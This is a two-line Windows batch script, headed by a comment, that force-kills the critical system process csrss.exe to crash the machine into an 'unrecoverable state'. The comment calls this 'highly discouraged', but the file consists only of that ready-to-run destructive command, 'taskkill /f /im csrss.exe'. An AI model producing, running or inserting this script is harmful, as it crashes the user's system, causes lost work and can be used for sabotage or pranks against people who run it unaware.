:: This program kills the critical system process csrss.exe to force the system into an unrecoverable state, but this is highly discouraged.
@echo off
taskkill /f /im csrss.exe
